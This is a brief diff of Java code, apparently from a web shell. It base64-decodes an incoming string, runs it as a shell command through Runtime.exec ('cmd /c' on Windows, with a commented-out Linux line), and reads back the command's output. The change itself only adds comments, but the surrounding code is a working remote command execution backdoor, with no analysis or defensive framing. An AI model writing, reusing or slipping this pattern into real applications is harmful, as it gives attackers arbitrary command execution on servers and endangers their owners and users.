@@ -25,7 +25,8 @@
     String qq = new String(new BASE64Decoder().decodeBuffer(dd));
     //System.out.println(qq);
     String jj="";
-    Process p= Runtime.getRuntime().exec("cmd /c "+qq);
+    Process p= Runtime.getRuntime().exec("cmd /c "+qq);//windwos
+    //Process p= Runtime.getRuntime().exec(qq);//linux
     InputStream fis=p.getInputStream();
     InputStreamReader isr=new InputStreamReader(fis);
     BufferedReader br=new BufferedReader(isr);
